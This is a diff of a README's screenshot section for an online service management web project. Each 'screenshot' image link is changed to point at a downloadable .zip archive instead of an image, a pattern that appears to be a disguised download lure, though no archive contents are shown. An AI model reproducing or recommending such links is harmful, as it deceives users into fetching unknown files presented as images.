@@ -21,34 +21,34 @@ This account will be created by the company to take action over the services and
 # Screenshots
 ## Requester account
 ### Dashboard
-![Screenshot_2021-02-22 Requester Profile](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Requester Profile](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
 
 ### Submit Request
-![Screenshot_2021-02-22 Submit Request](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Submit Request](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
 
 ### Requests Status
-![Screenshot_2021-02-22 Status](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Status](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
 
 
 ## Admin account
 ### Dashboard
-![Screenshot_2021-02-22 Dashboard](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Dashboard](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
 
 ### Work order
-![Screenshot_2021-02-22 Work Order](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
-![Screenshot_2021-02-22 Work Order(1)](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Work Order](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
+![Screenshot_2021-02-22 Work Order(1)](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
 
 ### Requests
-![Screenshot_2021-02-22 Requests](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Requests](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
 
 ### Assets
-![Screenshot_2021-02-22 Assests](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Assests](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
 
 ### Technician
-![Screenshot_2021-02-22 Technician](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Technician](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
 
 ### Sell Report
-![Screenshot_2021-02-22 Product Report](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Product Report](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
 
 ### Work Report
-![Screenshot_2021-02-22 Work Report](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/beneficence/Online-Service-Management-System.zip)
+![Screenshot_2021-02-22 Work Report](https://raw.githubusercontent.com/sakshi-code-cse/Online-Service-Management-System/main/Admin/Management_Service_System_Online_3.6.zip)
